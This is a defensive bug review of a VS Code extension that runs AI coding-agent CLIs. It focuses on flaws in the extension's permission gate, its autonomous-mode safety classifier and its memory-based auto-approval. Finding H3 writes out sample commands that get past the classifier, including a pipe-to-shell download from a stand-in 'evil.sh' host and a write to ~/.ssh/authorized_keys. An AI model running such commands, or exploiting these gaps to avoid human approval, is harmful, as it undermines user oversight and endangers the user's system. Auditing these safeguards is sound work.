# Mysti Core Managers — Bug Review

Scope: `src/extension.ts`, `src/managers/{ProviderManager, ConversationManager, ContextManager, CompactionManager, PermissionManager, AgentLifecycleManager, SetupManager, MemoryManager, AutonomousManager, SafetyClassifier, TelemetryManager}.ts`, plus the call sites in `src/providers/ChatViewProvider.ts`, `src/utils/permissionClassifier.ts`, `src/providers/ProviderRegistry.ts`, and `src/providers/base/BaseCliProvider.ts` needed to confirm behavior. Working tree on `feature/visual-testing` as-is. All findings verified by reading the code; line numbers from the current working tree.

---

## Critical

### C1. Permission gate default-allows unknown tool names — writes/commands run ungated while every CLI runs with `--yolo`/bypass flags

**Files:** `src/utils/permissionClassifier.ts:22-54` (allowlist + default), `:62-81` (gate); `src/providers/gemini/GeminiProvider.ts:247-250` (always `--yolo`), `:308,336-346` (raw tool names passed through); `src/providers/ChatViewProvider.ts:2871-2917` (gate is the only enforcement).

```ts
// permissionClassifier.ts
const WRITE_TOOLS: Record<string, PermissionActionType> = {
  'Edit': 'file-edit', 'edit_file': 'file-edit', 'replace_in_file': 'file-edit', ...
  'Write': 'file-create', 'write_to_file': 'file-create', 'create_file': 'file-create',
  ...
  'Bash': 'bash-command', 'bash': 'bash-command', 'shell': 'bash-command',
  'execute_command': 'bash-command', 'run_terminal_command': 'bash-command',
};
export function classifyToolAction(toolName: string): PermissionActionType {
  return WRITE_TOOLS[toolName] || 'file-read';   // unknown => never gated
}
```

```ts
// GeminiProvider.ts:247-250 — ALL non-yolo combos still pass --yolo
// "All other combinations: bypass CLI permissions to prevent stdin hang.
//  The stream-level tool-use gate in ChatViewProvider handles permission prompts."
args.push('--yolo');
```

The architecture (per the gate's own docstring) makes this stream-level gate "the sole enforcement point" — every provider disables the CLI's native permission prompts. The gate uses a *fixed allowlist of tool names* and treats anything unknown as `'file-read'` (never gated). Providers pass raw CLI tool names through (`GeminiProvider.parseStreamLine` forwards `data.tool_name` verbatim, `CopilotProvider.ts:494` likewise). The Gemini CLI's actual write tools (`write_file`, `replace`, `run_shell_command`, `web_fetch`) are **not** in the map — only similarly-named-but-different `write_to_file`, `replace_in_file`, `execute_command`, `run_terminal_command` are. Any tool name drift across the 12 supported CLIs (or any CLI update that renames a tool) silently downgrades a destructive operation to "read-only, no gate" while the CLI itself is in auto-approve mode. Note also: `'web-request'` is a defined `PermissionActionType`, but no tool name maps to it — web requests are *never* gated.

**Impact:** In `ask-before-edit` / `ask-permission` modes, file writes and shell command execution can proceed with no permission card at all for any provider whose tool names aren't in the allowlist.

**Fix:** Invert the default for tool classification — gate unknown tools (or at minimum classify unknowns as `bash-command`-equivalent caution), and/or maintain a per-provider tool-name normalization map in each provider's `parseStreamLine` so `toolCall.name` is canonical (`write_file → Write`, `run_shell_command → Bash`, etc.). Add a known-read-only allowlist (`Read`, `Grep`, `Glob`, `read_file`, `list_directory`, ...) instead of a known-write list.

---

## High

### H1. ProviderManager routes cancel/suspend/resume/clearSession/disposePersistentProcess to the *global default* provider, not the panel's provider

**Files:** `src/managers/ProviderManager.ts:228-243` (cancel), `:249-270` (suspend/resume), `:306-343` (clearSession/hasSession/getSessionId/disposePersistentProcess); panel provider override confirmed at `src/providers/ChatViewProvider.ts:336-346`.

```ts
public cancelRequest(panelId: string): void {
  try {
    const provider = this._getActiveProvider();        // <-- no providerId: global default
    provider.cancelCurrentRequest(panelId);
  } catch {
    // fallback kill only if registry lookup THROWS (it falls back to claude-code instead)
    ...
  }
  this._activePanelProcesses.delete(panelId);          // handle dropped without killing
}
```

Panels carry their own provider (`panelState.settingsOverrides.provider`, ChatViewProvider.ts:336-346), and @-mention routing runs non-default providers on the same panel. When a panel's provider differs from `mysti.defaultProvider`:

- `suspendRequest(panelId)` (used by the permission gate at ChatViewProvider.ts:2877 to SIGSTOP the CLI *before* tool execution) calls `suspendProcess` on the wrong provider instance, whose `_panelSessions` has no process for that panel → returns false → **the CLI keeps running while the permission card is shown**.
- On denial, `cancelRequest(panelId)` no-ops on the wrong provider, then deletes the tracked `ChildProcess` handle *without killing it* (kill happens only in the `catch` branch, which never executes because `_getActiveProvider()` falls back to claude-code instead of throwing). **A denied tool can execute anyway and the process leaks.**
- `clearSession`/`disposePersistentProcess` (used by lifecycle expiry, ChatViewProvider.ts:214-216) target the wrong provider, leaving real sessions/processes alive.

**Fix:** Thread the panel's provider id into all of these (the callers know `settings.provider` / `_getPanelProvider(panelId)`), or iterate all providers for panel-scoped operations, and make `cancelRequest` always SIGKILL the tracked `_activePanelProcesses` handle as a backstop before deleting it.

### H2. Autonomous continuations force `full-access` + `edit-automatically` — SafetyClassifier never runs after the first turn

**File:** `src/providers/ChatViewProvider.ts:3147-3154`; gate logic `src/utils/permissionClassifier.ts:62-81`.

```ts
const autoSettings: Settings = {
  mode: 'edit-automatically' as Settings['mode'],
  ...
  accessLevel: 'full-access' as Settings['accessLevel'],
  ...
};
```

With `mode='edit-automatically'` and `accessLevel='full-access'`, `shouldGateToolUse()` returns false for everything; CLI providers additionally select their full bypass flags (e.g. Gemini `--yolo`). Since `SafetyClassifier` is only consulted inside `requestPermissionInline` → `AutonomousManager.shouldAutoApprovePermission`, and that path is only reached via the gate, **none of the hard blocks (`rm -rf`, `sudo`, `git push --force`, DB drops, file deletion) are enforced during autonomous continuations** — precisely the unattended mode they were designed for. `MemoryManager.getMystiCapabilities()` even advertises "file deletion and destructive operations are always blocked in autonomous mode" (MemoryManager.ts:250).

**Fix:** During autonomous sessions, keep the gate active regardless of settings (gate every write/bash tool_use, route through `SafetyClassifier`, auto-approve `safe`, block `blocked`), rather than disabling the gate via settings.

### H3. SafetyClassifier safe-list matches only the command prefix — chained/compound commands and `npx` auto-approved as "safe"

**File:** `src/managers/SafetyClassifier.ts:56-67` (safe patterns), `:117-165` (classification order).

```ts
const SAFE_BASH_PATTERNS: RegExp[] = [
  /^\s*(ls|cat|head|tail|less|more|wc|grep|find|which|where|echo|pwd|date|whoami)\b/,
  ...
  /^\s*(npx\s+)/,
  ...
];
```

Blocked patterns are checked first across the whole string (good), but anything not on the blocklist that *starts* with a safe word is classified `safe → auto-approve` in **all** autonomous safety modes, including conservative:

- `ls && curl https://evil.sh | sh` → safe (pipe-to-shell isn't blocked; only pipe-TO-curl/wget/nc is).
- `npx <any-package>` → safe; npx downloads and executes arbitrary code.
- `find . -name '*.bak' -delete` → safe; deletes files (`rm -r/-f` blocklist doesn't cover `find -delete`).
- `echo 'x' > ~/.ssh/authorized_keys` → safe; redirection overwrite not considered.
- Plain `rm file` isn't blocked or safe-listed → `caution` → **auto-approved in aggressive mode** (SafetyClassifier.ts:379-384), contradicting "file deletion always blocked".

**Fix:** Require the *entire* command to be safe: reject commands containing `;`, `&&`, `||`, `|`, `>`/`>>`, backticks, `$(` before applying safe patterns (or tokenize and validate each segment). Remove `npx` and bare `echo`/`find` from the safe list, add `find ... -delete/-exec`, `\brm\b` (any form), and `curl|wget ... \| *sh` to the blocklist.

### H4. Permission-decision learning is dead code: request deleted before it is read

**Files:** `src/providers/ChatViewProvider.ts:4011-4019`; `src/managers/PermissionManager.ts:149-181`.

```ts
private _handlePermissionResponse(response: PermissionResponse): void {
  this._permissionManager.handleResponse(response);            // deletes from _pendingRequests
  const request = this._permissionManager.getPendingRequest(response.requestId); // always undefined
  if (request) {
    this._memoryManager.learnFromPermissionDecision(request, response);  // never runs
  }
}
```

`handleResponse()` removes the request from `_pendingRequests` (PermissionManager.ts:165) before `getPendingRequest()` is called. So the "MemoryManager learns from user overrides" pillar of autonomous mode never records anything from real user decisions. The only writer of `permission-preference` memories is the *semi-autonomous timeout* path (ChatViewProvider.ts:4058), which records the **AI's own decision** as if it were a user preference — a self-reinforcing feedback loop with zero human signal.

**Fix:** Capture `const request = this._permissionManager.getPendingRequest(response.requestId)` *before* calling `handleResponse`, or have `handleResponse` return the resolved request.

### H5. AgentLifecycleManager child-process protection is inert, and its child events can never fire

**Files:** `src/managers/AgentLifecycleManager.ts:184-188` (registerProcessPid — never called anywhere: only `requestShutdown` and `touchSession` are referenced from ChatViewProvider), `:274-315` (`_scanChildren`).

1) `registerProcessPid()` has **zero callers** in the codebase (verified by grep across `src/`). `lastKnownPid` is permanently `null`, `trackedChildPids` permanently empty, so `protectActiveChildren` / `processTreeTracking` (both shipped as settings) can never block an idle-timeout shutdown or a `requestShutdown`. The feature is dead at runtime.

2) Even if PIDs were registered, the event logic is inverted:

```ts
session.trackedChildPids = new Set([...allChildPids, ...aliveTracked]);  // set replaced FIRST
const combinedPids = Array.from(session.trackedChildPids);
const hadChildren = session.trackedChildPids.size > 0;                   // reads NEW state
if (combinedPids.length > 0 && !hadChildren) {        // length>0 implies hadChildren=true → never
  this._emitEvent('children-detected', ...);
} else if (combinedPids.length === 0 && hadChildren) { // length=0 implies hadChildren=false → never
  this._emitEvent('children-cleared', ...);
}
```

`children-detected` and `children-cleared` are mathematically unreachable.

**Fix:** Call `registerProcessPid(panelId, proc.pid)` where providers spawn/track processes (e.g. in `ProviderManager.registerProcess`, which already receives the `ChildProcess`); snapshot `const hadChildren = session.trackedChildPids.size > 0` *before* replacing the set.

---

## Medium

### M1. "Always allow" upgrades a single shared session access level across all panels and providers

**File:** `src/managers/PermissionManager.ts:36, 84-87, 167-171`.

```ts
if (response.decision === 'always-allow') {
  this._sessionAccessLevel = 'full-access';   // single field for the whole extension
}
...
if (this._sessionAccessLevel === 'full-access') { return true; }  // every future request, every panel
```

PermissionManager is a singleton; `_sessionAccessLevel` is not keyed by panel. One click of "Always allow" in one tab silently auto-approves *all* future operations in every other panel, for every provider, until the window reloads or `resetSessionAccessLevel` is called. This violates the project's per-panel isolation principle for the most security-sensitive state in the system.

**Fix:** Key the upgrade per panel (`Map<panelId, AccessLevel>`) and pass `panelId` through `requestPermission` (the webview already posts per-panel).

### M2. AutonomousManager memory matching over-generalizes: one approval teaches approval of the whole action type

**Files:** `src/managers/AutonomousManager.ts:186-218`; `src/managers/MemoryManager.ts:159-180` (tags include `request.actionType`), `:97-145` (tag match scores +3).

The caution-path query is `"${request.actionType} ${request.title} ${request.description}"`. `learnFromPermissionDecision` stores `request.actionType` (e.g. `bash-command`) as a tag, and `query()` gives +3 for any tag contained in the query text. So *any* past `bash-command` decision with confidence ≥ 0.6 matches *any* new bash command (`matchingPref` only requires `relevanceScore > 0`). Approving `npm install` once would auto-approve unrelated future bash commands at caution level. Additionally, `matchingPref.entry.content.includes('approved')` (line 200) misreads a *denied* memory as approval if the request title happens to contain the word "approved". (Currently masked by H4 — user-path memories are never written — but the semi-autonomous path does write them.)

**Fix:** Require a minimum relevance score well above the action-type tag weight, exclude the actionType tag from scoring (or compare command stems for bash), and parse the stored decision from a structured field instead of substring matching.

### M3. MemoryManager: compounding confidence decay at capacity + broken dirty-flag protocol starves file sync

**File:** `src/managers/MemoryManager.ts:534-555` (`_prune`), `:465-476` + `:522-529` (dirty flag).

```ts
private _prune(): void {
  if (this._entries.length <= this._maxEntries) { return; }
  for (const entry of this._entries) {
    const daysSinceCreation = (now - entry.createdAt) / 86400000;
    entry.confidence *= Math.pow(AUTONOMOUS_MEMORY_DECAY_FACTOR, daysSinceCreation / 30);  // re-applied EVERY call
  }
  ...
  this._entries = this._entries.filter(e => e.confidence > 0.1).slice(0, this._maxEntries);
}
```

The decay is a function of *total elapsed age* but is applied multiplicatively on *every* prune invocation (every `addMemory` once at the 500-entry cap). A 30-day-old entry loses ×0.95 per add; ~45 adds drive any entry below the 0.1 purge threshold regardless of usefulness — mass eviction of learned preferences. Separately, `_saveToGlobalState()` sets `_dirty = false` (line 473) even though `_syncToFiles()` hasn't run, so the 5-minute file-sync interval (`if (this._dirty)`) almost never fires after `addMemory` — `~/.mysti/memory/preferences.json` ("long-term memory") goes stale except when `query()` happens to set dirty.

**Fix:** Store `lastDecayAt` per entry and decay only for the delta since the last decay pass; use separate dirty flags for globalState vs file sync.

### M4. CompactionManager token math omits `cache_creation_input_tokens`; usage not recorded when compaction triggers

**Files:** `src/managers/CompactionManager.ts:94, 124`; call site `src/providers/ChatViewProvider.ts:3117-3122`.

```ts
const currentFill = usage.input_tokens + (usage.cache_read_input_tokens || 0);  // cache_creation ignored
```

For Anthropic-style usage, context occupancy = `input_tokens + cache_read_input_tokens + cache_creation_input_tokens`. On turns that write large prompt caches (first big-context message), the fill is undercounted by exactly the cached amount, so the 75% threshold can be crossed without triggering — the overflow-prevention feature misses its highest-risk case. Also, at the call site `recordUsage` runs only in the `else` branch, so cumulative `_panelUsage` totals (surfaced via `getUsage`) skip every compacting turn.

**Fix:** Include `cache_creation_input_tokens` in `currentFill` in both `recordUsage` and `shouldCompact`; call `recordUsage` unconditionally before the branch.

### M5. Client-side summarization can silently drop messages sent during compaction

**Files:** `src/managers/CompactionManager.ts:185-256`; fired without await at `src/providers/ChatViewProvider.ts:3118-3119`.

```ts
const toSummarize = messages.slice(0, -COMPACTION_MESSAGES_TO_PRESERVE);
const toPreserve = messages.slice(-COMPACTION_MESSAGES_TO_PRESERVE);
// ... await multi-second LLM summarization ...
conversation.messages = [summaryMessage, ...toPreserve];   // anything appended meanwhile is lost
```

`_executeCompaction` is intentionally not awaited ("don't block the response flow"). If the user sends a message (or autonomous continuation fires) while the summary request is in flight, `addMessageToConversation` appends to `conversation.messages`, and the assignment above then discards it. The replacement is also never explicitly persisted (relies on the next `_saveConversations` from an unrelated path).

**Fix:** Recompute `toPreserve` from the live array at replacement time (splice only the originally-summarized prefix), or block sends for the panel during client-side compaction; persist via ConversationManager after mutation.

### M6. `switchConversation` never persists the current conversation id

**File:** `src/managers/ConversationManager.ts:71-77`.

```ts
public switchConversation(id: string): boolean {
  if (this._conversations.has(id)) {
    this._currentConversationId = id;   // no _saveConversations()
    return true;
  }
  ...
}
```

Every other mutator saves; switching does not. If the user switches conversations and reloads the window without triggering another save, the UI restores the previous conversation. Low-cost fix: call `this._saveConversations()`.

### M7. Unbounded globalState growth: full file contents persisted per message, no conversation pruning, full-map rewrite on every message

**Files:** `src/providers/ChatViewProvider.ts:2377-2388` (context stored as-is; only attachment base64 stripped); `src/managers/ConversationManager.ts:151-158, 195-199, 613-624`.

Each user message persists its `ContextItem[]` — which includes the *entire text content* of every attached file — into `mysti.conversations` in globalState. Conversations are never pruned or capped (the `MAX_CONVERSATION_MESSAGES = 10` constant in constants.ts:43 is referenced nowhere; BaseCliProvider hardcodes `slice(-10)` at line 1401 for prompt-building only). `_saveConversations` serializes the **entire** conversation map on every single message. Over weeks of use this makes every send pay a multi-MB JSON serialize + state-DB write, and `_loadConversations` slows activation. Additionally `_saveConversations` re-throws after catching (ConversationManager.ts:622-623) into callers that never await → unhandled promise rejections on save failure.

**Fix:** Strip `ContextItem.content` (keep path/lines) before persisting, cap stored conversations (count and/or age), debounce saves, and stop re-throwing into sync callers (or make callers await).

### M8. ContextManager bucket mismatch: Explorer commands write to `'default'`, panels read `'sidebar'`/`panel_*`

**Files:** `src/extension.ts:315-349` (no panelId → `'default'`); `src/managers/ContextManager.ts:41-44, 122-132`; `src/providers/ChatViewProvider.ts:75` (`_sidebarId = 'sidebar'`), `:781, 794, 3099, 3159` (panel-keyed reads/removals).

`mysti.addToContext` / `mysti.clearContext` operate on the implicit `'default'` bucket, but every panel (including the sidebar) is keyed `'sidebar'` or `panel_<ts>`. Consequences: backend reads of `getContext(panelId)` (channel-injected messages at 3099, autonomous continuations at 3159) never see Explorer-added items; removing a chip from the webview calls `removeFromContext(id, panelId)` against the wrong bucket (item silently stays in `'default'`); `mysti.clearContext` clears a bucket nothing reads. The UI happens to work for plain sends only because the webview echoes its chips back in the send payload.

**Fix:** Route the commands through ChatViewProvider to the active/sidebar panel id, or make `'default'` an alias for the sidebar bucket.

### M9. Quick actions persist agent config under the wrong key (panelId as conversationId)

**File:** `src/providers/ChatViewProvider.ts:607` vs correct pattern at `:1233-1237`.

```ts
this._conversationManager.updateAgentConfig(panelId, newConfig);   // panelId is 'sidebar'/'panel_*', not a conversation UUID
```

`updateAgentConfig` looks up `this._conversations.get(conversationId)` → miss → returns false (ignored). The webview is then told `agentConfigUpdated`, but `_handleSendMessage` reads `getAgentConfig(conversationId)` (line 2416) and finds nothing — quick-action auto-selected persona/skills are silently dropped. Fix: use `panelState.currentConversationId` as the `updateAgentConfig` case does.

### M10. Activation blocks on serial CLI discovery for 12 providers

**Files:** `src/extension.ts:82` (`await providerManager.initialize()` before anything else is registered); `src/providers/ProviderRegistry.ts:106-123` (serial `await` per provider); `src/providers/base/BaseCliProvider.ts:192-199` (`initialize` = `discoverCli`); `src/utils/platform.ts:223-243` (path probes + `which` spawn per missing CLI).

`activate()` awaits a sequential loop over 12 providers; each `discoverCli` does a series of `fs.accessSync` probes and, for any CLI not found at a known path, spawns `which <cmd>`. On a machine with few CLIs installed that's up to ~12 serial process spawns plus filesystem scans (NVM version-dir walks for some providers) before the webview provider, commands, and status bar are registered. Other synchronous activation work compounds it: `ConversationManager._loadConversations` deserializes the (unbounded, see M7) conversation blob, and `MemoryManager` constructor + `initProjectMemory` do synchronous `fs` reads/mkdirs (MemoryManager.ts:58-63, 284-298). Discovery results aren't even consumed at startup (only logged).

**Fix:** Register the webview/commands first; run `initializeAll` in the background with `Promise.allSettled` (parallel), or drop the eager discovery entirely (SetupManager re-discovers on demand anyway).

---

## Low

### L1. SetupManager auth handling rough edges
- `src/managers/SetupManager.ts:722-725` — Cursor API key saved to `mysti.cursorApiKey` in plain settings (synced by Settings Sync, visible in settings.json) instead of `ExtensionContext.secrets`.
- `:711` — GCA setup appends `export GOOGLE_GENAI_USE_GCA=true` to `~/.zshrc` unconditionally, regardless of the user's shell; repeated runs duplicate the line.
- `:672, 707` — auth terminals force `shellPath: '/bin/bash'` on macOS/Linux; users whose CLI PATH is configured in `~/.zshrc` (default macOS + nvm) get "command not found".
- `:730-731` — any provider other than cursor/gemini gets the API key shoved into `OPENAI_API_KEY`.

### L2. TelemetryManager
- `src/managers/TelemetryManager.ts:50-54` — `vscode.env.isTelemetryEnabled` sampled once at construction; no `onDidChangeTelemetryEnabled` listener (the reporter library mitigates, but Mysti's own `_enabled` short-circuit stays stale, including staying *disabled* after the user re-enables telemetry).
- `:80-84` — `sendError` forwards `error.message`, which for fs/spawn errors embeds absolute file paths — at odds with the file's "No PII: never logs file paths" contract.
- `:70, 87` — every event logged to console in production builds.

### L3. extension.ts polish
- `:566-577` — `_formatProviderLabel` lacks entries for `opencode`, `qwen-code`, `ollama`, `localai`, `manus`; status bar shows raw ids.
- `:260` — `globalState.update('mysti.lastVersion', ...)` not awaited (benign, but inconsistent).
- `deactivate()` (579-619) doesn't dispose `canvasManager`; providerManager disposal relies on the `chatViewProvider.dispose()` subscription (works, but the asymmetry is fragile).

### L4. Misc manager smells
- `src/constants.ts:43` — `MAX_CONVERSATION_MESSAGES` is dead; `BaseCliProvider.ts:1401` hardcodes `slice(-10)`.
- `src/managers/AutonomousManager.ts:66-71` — `onDidChangeConfiguration` disposable never stored/disposed.
- `src/managers/AutonomousManager.ts:394-411` — `_continueTaskQueue` marks tasks complete unconditionally, regardless of whether the response indicates success.
- `src/managers/AgentLifecycleManager.ts:84` — `registerSession` early-returns when lifecycle is disabled; sessions started while disabled are never tracked after the user re-enables.
- `src/managers/ConversationManager.ts:597-607` — `_loadConversations` does no shape validation; a corrupt `stored.conversations` (non-iterable) would throw in the constructor and abort activation.

---

## Improvement opportunities (non-bug)

1. **Centralize "panel → provider" resolution.** Half the ProviderManager API takes an optional provider id and half infers the global default. A `resolve(panelId)` helper (backed by ChatViewProvider's `_getPanelProvider`) would eliminate the whole H1 class of bugs.
2. **Persist `PermissionManager` decisions per (panelId, actionType)** rather than a binary session upgrade — would make "Always allow" mean "always allow *this kind of thing here*", matching user expectations.
3. **SafetyClassifier as shared pre-flight for *all* modes.** Today it's autonomous-only. Running the blocklist on every gated bash command (even in manual modes) would surface "this command is force-push" warnings in the permission card UI.
4. **CompactionManager: debounce + ownership.** Compaction fires from inside the response loop and runs detached; giving it a per-panel queue (one in-flight op, sends blocked or queued) would remove the M5 race and the dual-process-per-panel hazard.
5. **ConversationManager storage schema versioning** (it stores raw `[string, Conversation][]` with no version field) would allow safe migration when message shape changes — important given import paths accept arbitrary external JSON.
6. **AgentLifecycleManager: emit a typed `session-expired` reason** and actually wire process-kill into the manager (today expiry only deletes bookkeeping and relies on a ChatViewProvider listener to dispose persistent processes via the default-provider path).
7. **SetupManager `getSetupStatus`/`getWizardStatus`/`runDiagnostics` duplicate the same discover+auth loop three times** — extract one probe function with a short TTL cache; these are called from webview refreshes and each runs `discoverCli` + `checkAuthentication` for all 12 providers serially.
8. **Use `context.secrets` for all API keys** and a single `AuthCredentialStore` instead of env-var mutation of the extension host process (`process.env[...] = apiKey` affects every other extension in the host).

## Notable strengths

- **Per-panel session architecture** (`_panelSessions`, session-object-passing into `buildCliArgs`/`parseStreamLine`) is consistently applied across providers and managers; ContextManager/CompactionManager keying follows it correctly.
- **Process shutdown hygiene**: graceful SIGTERM → delayed SIGKILL with constants (`PROCESS_KILL_GRACE_PERIOD_MS`), and the SIGSTOP-before-permission-card design (when it routes correctly) is a genuinely clever way to stop a piped CLI mid-tool.
- **SetupManager install flow** is unusually robust: multi-method npm detection (direct/NVM paths/login shell), pre-flight global-write check with automatic `--prefix ~/.mysti/cli` fallback, transient-error-only retries, and actionable per-category suggested fixes.
- **SafetyClassifier ordering** is correct: hardcoded blocklist → user blocklist → config gates → safe list → mode-based default, with user patterns compiled defensively (invalid regex tolerated).
- **Audit trail** in AutonomousManager: every decision (including blocked) is logged, capped, and surfaced via callback — good observability for an unattended mode.
- **Error isolation** in lifecycle event fan-out (per-callback try/catch) and brainstorm synthesis fallbacks.
- **ConversationManager import paths** are defensive: format auto-detection, per-line try/catch for JSONL, role sanitization, and base64 stripping on export.
